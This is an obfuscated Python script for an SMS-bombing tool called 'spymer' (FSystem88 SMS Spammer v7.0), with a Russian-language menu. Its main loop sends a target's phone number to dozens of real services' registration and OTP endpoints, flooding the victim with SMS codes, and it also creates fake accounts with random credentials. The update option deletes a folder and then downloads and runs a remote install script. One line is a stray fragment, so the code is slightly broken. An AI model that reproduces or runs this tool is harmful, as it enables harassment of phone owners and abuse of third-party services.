#!/usr/bin/python3
import requests #line:4
import random #line:5
import datetime #line:6
import sys #line:7
import time #line:8
import argparse #line:9
import os #line:10
import json #line:11
from colorama import Fore ,Back ,Style #line:12
os .system ("clear")#line:14
def Main ():#line:15
	global info #line:16
	info =" "#line:17
	O0O0O00000OO00000 =Fore .GREEN +'''
8888888888888888888888888
8888888888888888888888888
888        888        888
888  888888888  8888  888
888  888888888  888888888
888        888        888
888  888888888888888  888
888  888888888  8888  888
888  888888888        888
8888888888888888888888888
8888888888888888888888888
8888    FSystem88    8888
8888   SMS Spammer   8888
8888      v.7.0      8888
8888     MPL-2.0     8888
8888888888888888888888888
8888888888888888888888888
'''+Style .RESET_ALL #line:36
	def O0OO0OOOOO0OO000O ():#line:37
		global info #line:38
		while True :#line:39
			os .system ("clear")#line:40
			print (O0O0O00000OO00000 )#line:41
			print (info )#line:42
			print ('''
1) Запустить спамер.
2) Добавить номер в антиспам.
3) Проверить номер в антиспамбазе.
4) Обновить спамер.
5) Exit.

Введите номер:''')#line:50
			OO000O0O00O0OO0O0 =input ("\033[1;36mspymer > \033[1;m")#line:51
			if OO000O0O00O0OO0O0 =="1":#line:52
				print ("Введите номер (Enter - отмена):")#line:53
				OOO0O0O000OOOOOOO =input ("\033[1;36mspymer > \033[1;m")#line:54
				try :#line:55
					if int (OOO0O0O000OOOOOOO ):#line:56
						print ("Введите кол-во потоков (Enter - отмена):")#line:57
						O0O0OOOO000OO0OOO =input ("\033[1;36mspymer > \033[1;m")#line:58
						try :#line:59
							if int (O0O0OOOO000OO0OOO ):#line:60
								O0O0OOOO000OO0OOO =int (O0O0OOOO000OO0OOO )#line:61
								_O000O000O0OOO00O0 =OOO0O0O000OOOOOOO #line:62
								if _O000O000O0OOO00O0 [0 ]=='+':#line:63
									_O000O000O0OOO00O0 =_O000O000O0OOO00O0 [1 :]#line:64
								if _O000O000O0OOO00O0 [0 ]=='8':#line:65
									_O000O000O0OOO00O0 ='7'+_O000O000O0OOO00O0 [1 :]#line:66
								if _O000O000O0OOO00O0 [0 ]=='9':#line:67
									_O000O000O0OOO00O0 ='7'+_O000O000O0OOO00O0 #line:68
								OO0000OO000OO0OOO =0 #line:69
								OOOO00000O0OO0000 =requests .post ('https://rainbow-t-shirt.com/spymer/json.php',data ={'phone':_O000O000O0OOO00O0 }).json ()["id"]#line:70
								if int (OOOO00000O0OO0000 )>0 :#line:71
									info =Fore .RED +"Номер телефона находится в антиспам листе.\nЧтобы попасть туда - напиши мне в Telegram:\n@FSystem88"+Style .RESET_ALL #line:72
									O0OO0OOOOO0OO000O ()#line:73
								elif int (OOOO00000O0OO0000 )==0 :#line:74
									_OO0O0000OOOO0000O =''#line:75
									for O0000OOOO00O00O0O in range (12 ):#line:76
										_OO0O0000OOOO0000O =_OO0O0000OOOO0000O +random .choice (list ('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))#line:77
										OO0OO00O0OO0O0O00 =_OO0O0000OOOO0000O +random .choice (list ('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))#line:78
										OOO000O000OOO0O00 =_OO0O0000OOOO0000O +random .choice (list ('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))#line:79
									_O0OO00OO000O000OO =_O000O000O0OOO00O0 [1 :]#line:80
									_OO000OO0OOOOOOOOO ='+'+_O000O000O0OOO00O0 [0 ]+'('+_O000O000O0OOO00O0 [1 :4 ]+')'+_O000O000O0OOO00O0 [4 :7 ]+'-'+_O000O000O0OOO00O0 [7 :9 ]+'-'+_O000O000O0OOO00O0 [9 :11 ]#line:81
									_OOOO000O00OOOOOO0 =_O0OO00OO000O000OO [:3 ]+'+'+_O0OO00OO000O000OO [3 :6 ]+'-'+_O0OO00OO000O000OO [6 :8 ]+'-'+_O0OO00OO000O000OO [8 :10 ]#line:82
									_O0O0O0O0O0O00O000 ='+'+_O000O000O0OOO00O0 [0 ]+'+('+_O000O000O0OOO00O0 [1 :4 ]+')'+_O000O000O0OOO00O0 [4 :7 ]+'-'+_O000O000O0OOO00O0 [7 :9 ]+'-'+_O000O000O0OOO00O0 [9 :11 ]#line:83
									_OOO000000O0O0OO00 ='+'+_O000O000O0OOO00O0 [0 ]+' ('+_O000O000O0OOO00O0 [1 :4 ]+') '+_O000O000O0OOO00O0 [4 :7 ]+' '+_O000O000O0OOO00O0 [7 :9 ]+' '+_O000O000O0OOO00O0 [9 :11 ]#line:84
									_O0OOOO0OOOO00OOOO =_O000O000O0OOO00O0 [1 :4 ]+') '+_O000O000O0OOO00O0 [4 :7 ]+'-'+_O000O000O0OOO00O0 [7 :9 ]+'-'+_O000O000O0OOO00O0 [9 :11 ]#line:85
									print ('Номер: {}\nЦиклы: {}'.format (OOO0O0O000OOOOOOO ,O0O0OOOO000OO0OOO )+'\nСпамер запущен.\nЕсли Вы хотите остановить - нажмите Ctrl+C.')#line:86
									_O000O000O0OOO00O0 =_O000O000O0OOO00O0 #line:87
									_OOO00000OO00OO0O0 =_OO0O0000OOOO0000O +f'{OO0000OO000OO0OOO}'+'@gmail.com'#line:88
									O00O0OOO0OOOO00O0 =_OO0O0000OOOO0000O +f'{OO0000OO000OO0OOO}'+'@gmail.com'#line:89
									while OO0000OO000OO0OOO <O0O0OOOO000OO0OOO :#line:90
										try :#line:91
											requests .post ('https://p.grabtaxi.com/api/passenger/v2/profiles/register',data ={'phoneNumber':_O000O000O0OOO00O0 ,'countryCode':'ID','name':'test','email':'mail@mail.com','deviceToken':'*'},headers ={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})#line:92
											requests .post ('https://moscow.rutaxi.ru/ajax_keycode.html',data ={'l':_O0OO00OO000O000OO }).json ()["res"]#line:93
											requests .post ('https://belkacar.ru/get-confirmation-code',data ={'phone':_O000O000O0OOO00O0 })#line:94
											requests .post ('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data ={'phone_number':_O000O000O0OOO00O0 })#line:95
											requests .post ('https://app.karusel.ru/api/v1/phone/',data ={'phone':_O000O000O0OOO00O0 })#line:96
											requests .post ('https://api.tinkoff.ru/v1/sign_up',data ={'phone':'+'+_O000O000O0OOO00O0 })#line:97
											requests .post ('https://api.mtstv.ru/v1/users',json ={'msisdn':_O000O000O0OOO00O0 })#line:98
											requests .post ('https://youla.ru/web-api/auth/request_code',data ={'phone':_O000O000O0OOO00O0 })#line:99
											#requests .post ('https://pizzahut.ru/account/password-reset',data ={'reset_by':'phone','action_id':'pass-recovery','phone':_OOO000000O0O0OO00 ,'_token':'*'})#line:100
											requests .post ('https://www.rabota.ru/remind',data ={'credential':_O000O000O0OOO00O0 })#line:101
											requests .post ('https://rutube.ru/api/accounts/sendpass/phone',data ={'phone':'+'+_O000O000O0OOO00O0 })#line:102
											requests .post ('https://www.citilink.ru/registration/confirm/phone/+'+_O000O000O0OOO00O0 +'/')#line:103
											requests .post ('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',data ={'name':_OO0O0000OOOO0000O ,'phone':_O000O000O0OOO00O0 ,'promo':'yellowforma'})#line:104
											requests .get ('https://www.oyorooms.com/api/pwa/generateotp?phone='+_O0OO00OO000O000OO +'&country_code=%2B7&nod=4&locale=en')#line:105
											requests .post ('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp',params ={'pageName':'loginByUserPhoneVerification','fromCheckout':'false','fromRegisterPage':'true','snLogin':'','bpg':'','snProviderId':''},data ={'phone':'+7 915 3509908','g-recaptcha-response':'','recaptcha':'on'})#line:106
											requests .post ('https://newnext.ru/graphql',json ={'operationName':'registration','variables':{'client':{'firstName':'Иван','lastName':'Иванов','phone':_O000O000O0OOO00O0 ,'typeKeys':['Unemployed']}},'query':'mutation registration($client: ClientInput!) {' '\n  registration(client: $client) {' '\n    token\n    __typename\n  }\n}\n'})#line:107
											requests .post ('https://api.sunlight.net/v3/customers/authorization/',data ={'phone':_O000O000O0OOO00O0 })#line:108
											requests .post ('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json ={'client_type':'personal','email':_OOO00000OO00OO0O0 ,'mobile_phone':_O000O000O0OOO00O0 ,'deliveryOption':'sms'})#line:109
											requests .post ('https://online.sbis.ru/reg/service/',json ={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_O000O000O0OOO00O0 },'id':'1'})#line:110
											requests .post ('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',json ={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone':_O0OO00OO000O000OO ,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})#line:111
											requests .post ('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru',data ={'phone':_O000O000O0OOO00O0 })#line:112
											requests .post ('https://app.karusel.ru/api/v1/phone/',data ={'phone':_O000O000O0OOO00O0 })#line:113
											requests .post ('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms',json ={'phone':'+'+_O000O000O0OOO00O0 })#line:114
											requests .post ('https://lenta.com/api/v1/authentication/requestValidationCode',json ={'phone':'+'+_O000O000O0OOO00O0 })#line:115
											requests .post ('https://cloud.mail.ru/api/v2/notify/applink',json ={"phone":"+"+_O000O000O0OOO00O0 ,"api":2 ,"email":"email","x-email":"x-email"})#line:116
											requests .post ('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params ={"pageName":"registerPrivateUserPhoneVerificatio"},data ={"phone":_O000O000O0OOO00O0 ,"recaptcha":'off',"g-recaptcha-response":""})#line:117
											requests .post ("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data ={"st.r.phone":"+"+_O000O000O0OOO00O0 })#line:118
											requests .post ('https://plink.tech/register/',json ={"phone":_O000O000O0OOO00O0 })#line:119
											requests .post ("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json ={"phone":_O000O000O0OOO00O0 })#line:120
											requests .post ("http://smsgorod.ru/sendsms.php",data ={"number":_O000O000O0OOO00O0 })#line:121
											requests .post ('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data ={'phone_number':_O000O000O0OOO00O0 })#line:122
											requests .post ('https://passport.twitch.tv/register?trusted_request=true',json ={"birthday":{"day":11 ,"month":11 ,"year":1999 },"client_id":"kd1unb4b3q4t58fwlpcbzcbnm76a8fp","include_verification_code":True ,"password":OO0OO00O0OO0O0O00 ,"phone_number":_O000O000O0OOO00O0 ,"username":OOO000O000OOO0O00 })#line:123
											requests .post ('https://cabinet.wi-fi.ru/api/auth/by-sms',data ={'msisdn':_O000O000O0OOO00O0 },headers ={'App-ID':'cabinet'})#line:124
											requests .post ("https://api.wowworks.ru/v2/site/send-code",json ={"phone":_O000O000O0OOO00O0 ,"type":2 })#line:125
											requests .post ('https://eda.yandex/api/v1/user/request_authentication_code',json ={"phone_number":"+"+_O000O000O0OOO00O0 })#line:126
											requests .post ('https://youla.ru/web-api/auth/request_code',data ={'phone':_O000O000O0OOO00O0 })#line:127
											requests .post ('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json ={"client_type":"personal","email":f"{O00O0OOO0OOOO00O0}@gmail.ru","mobile_phone":_O000O000O0OOO00O0 ,"deliveryOption":"sms"})#line:128
											requests .post ("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data ={"phone":_O000O000O0OOO00O0 })#line:129
											requests .post ('https://www.delivery-club.ru/ajax/user_otp',data ={"phone":_O000O000O0OOO00O0 })#line:130
											requests .post ('https://belkacar.ru/get-confirmation-code',data ={'phone':_O000O000O0OOO00O0 })#line:131
											requests .post ("https://api.carsmile.com/",json ={"operationName":"enterPhone","variables":{"phone":_O000O000O0OOO00O0 },"query":"mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})#line:132
											requests .post ('https://www.citilink.ru/registration/confirm/phone/+'+_O000O000O0OOO00O0 +'/')#line:133
											requests .post ("https://api.delitime.ru/api/v2/signup",data ={"SignupForm[username]":_O000O000O0OOO00O0 ,"SignupForm[device_type]":3 })#line:134
											r
											#requests .post ("https://guru.taxi/api/v1/driver/session/verify",json ={"phone":{"code":1 ,"number":_O000O000O0OOO00O0 }})#line:136
											requests .post ('https://www.icq.com/smsreg/requestPhoneValidation.php',data ={'msisdn':_O000O000O0OOO00O0 ,"locale":'en','countryCode':'ru','version':'1',"k":"ic1rtwz1s1Hj1O0r","r":"46763"})#line:137
											requests .post ("https://terra-1.indriverapp.com/api/authorization?locale=ru",data ={"mode":"request","phone":"+"+_O000O000O0OOO00O0 ,"phone_permission":"unknown","stream_id":0 ,"v":3 ,"appversion":"3.20.6","osversion":"unknown","devicemodel":"unknown"})#line:138
											requests .post ("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",data ={"password":OO0OO00O0OO0O0O00 ,"application":"lkp","login":"+"+_O000O000O0OOO00O0 })#line:139
											requests .post ('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json ={"phone":_O000O000O0OOO00O0 })#line:140
											requests .post ("https://api.ivi.ru/mobileapi/user/register/phone/v6",data ={"phone":_O000O000O0OOO00O0 })#line:141
											requests .post ('https://youdo.com/api/verification/sendverificationcode/',data ={'PhoneE164':_O000O000O0OOO00O0 })#line:142
											OO0000OO000OO0OOO +=1 #line:143
											print (('{} круг пройден.').format (OO0000OO000OO0OOO ))#line:144
										except KeyboardInterrupt :#line:145
											info =Fore .RED +"Спамер остановлен.\nТелефон: {}\nКол-во пройденных циклов: {}".format (OOO0O0O000OOOOOOO ,OO0000OO000OO0OOO )+Style .RESET_ALL #line:146
											O0OO0OOOOO0OO000O ()#line:147
										except :#line:148
											pass #line:149
									info =Fore .RED +"Готово.\nТелефон: {}\nКол-во пройденных циклов: {}".format (OOO0O0O000OOOOOOO ,OO0000OO000OO0OOO )+Style .RESET_ALL #line:150
									O0OO0OOOOO0OO000O ()#line:151
						except :#line:152
							info =Fore .RED +"Некорректно введено кол-во потоков!".format (OOO0O0O000OOOOOOO )+Style .RESET_ALL #line:153
							O0OO0OOOOO0OO000O ()#line:154
				except :#line:155
					info =Fore .RED +"Некорректно введен номер телефона!".format (OOO0O0O000OOOOOOO )+Style .RESET_ALL #line:156
					O0OO0OOOOO0OO000O ()#line:157
			if OO000O0O00O0OO0O0 =="2":#line:159
				print ("Введите номер:")#line:160
				OOO0O0O000OOOOOOO =input ("\033[1;36mspymer > \033[1;m")#line:161
				if OOO0O0O000OOOOOOO [0 ]=='+':#line:162
					OOO0O0O000OOOOOOO =OOO0O0O000OOOOOOO [1 :]#line:163
				if OOO0O0O000OOOOOOO [0 ]=='8':#line:164
					OOO0O0O000OOOOOOO ='7'+OOO0O0O000OOOOOOO [1 :]#line:165
				if OOO0O0O000OOOOOOO [0 ]=='9':#line:166
					OOO0O0O000OOOOOOO ='7'+OOO0O0O000OOOOOOO #line:167
				try :#line:168
					if int (OOO0O0O000OOOOOOO ):#line:169
						OOOO00000O0OO0000 =requests .post ('https://rainbow-t-shirt.com/spymer/json.php',data ={'phone':OOO0O0O000OOOOOOO }).json ()["id"]#line:170
						if int (OOOO00000O0OO0000 )>0 :#line:171
							info =Fore .GREEN +"Номер {} уже ЕСТЬ в антиспам листе.".format (OOO0O0O000OOOOOOO )+Style .RESET_ALL #line:172
							O0OO0OOOOO0OO000O ()#line:173
						elif int (OOOO00000O0OO0000 )==0 :#line:174
							requests .post ('https://rainbow-t-shirt.com/spymer/ajax.php',data ={'phone':OOO0O0O000OOOOOOO })#line:175
							info =Fore .GREEN +"Номер {} добавлен в антиспам лист.".format (OOO0O0O000OOOOOOO )+Style .RESET_ALL #line:176
							O0OO0OOOOO0OO000O ()#line:177
				except :#line:178
					info =Fore .RED +"Некорректно введен номер телефона!".format (OOO0O0O000OOOOOOO )+Style .RESET_ALL #line:179
					O0OO0OOOOO0OO000O ()#line:180
			if OO000O0O00O0OO0O0 =="3":#line:182
				print ("Введите номер для проверки:")#line:183
				OOO0O0O000OOOOOOO =input ("\033[1;36mspymer > \033[1;m")#line:184
				if OOO0O0O000OOOOOOO [0 ]=='+':#line:185
					OOO0O0O000OOOOOOO =OOO0O0O000OOOOOOO [1 :]#line:186
				if OOO0O0O000OOOOOOO [0 ]=='8':#line:187
					OOO0O0O000OOOOOOO ='7'+OOO0O0O000OOOOOOO [1 :]#line:188
				if OOO0O0O000OOOOOOO [0 ]=='9':#line:189
					OOO0O0O000OOOOOOO ='7'+OOO0O0O000OOOOOOO #line:190
				try :#line:191
					if int (OOO0O0O000OOOOOOO ):#line:192
						OOOO00000O0OO0000 =requests .post ('https://rainbow-t-shirt.com/spymer/json.php',data ={'phone':OOO0O0O000OOOOOOO }).json ()["id"]#line:193
						if int (OOOO00000O0OO0000 )>0 :#line:194
							info =Fore .GREEN +"Номер {} ЕСТЬ в антиспам листе.".format (OOO0O0O000OOOOOOO )+Style .RESET_ALL #line:195
							O0OO0OOOOO0OO000O ()#line:196
						elif int (OOOO00000O0OO0000 )==0 :#line:197
							info =Fore .RED +"Номера {} НЕТУ в антиспам листе.".format (OOO0O0O000OOOOOOO )+Style .RESET_ALL #line:198
							O0OO0OOOOO0OO000O ()#line:199
				except :#line:200
					info =Fore .RED +"Некорректно введен номер телефона!".format (OOO0O0O000OOOOOOO )+Style .RESET_ALL #line:201
					O0OO0OOOOO0OO000O ()#line:202
			if OO000O0O00O0OO0O0 =="4":#line:204
				O00O00OO0O0OO0000 =os .system ("cd && rm -rf ~/spymer && git clone https://github.com/FSystem88/spymer && sh ~/spymer/install.sh")#line:205
				exit ()#line:206
			if OO000O0O00O0OO0O0 =="5":#line:208
				print (Fore .BLUE +"Дотиданья"+Style .RESET_ALL )#line:209
				exit ()#line:210
	O0OO0OOOOO0OO000O ()#line:211
Main ()#line:214
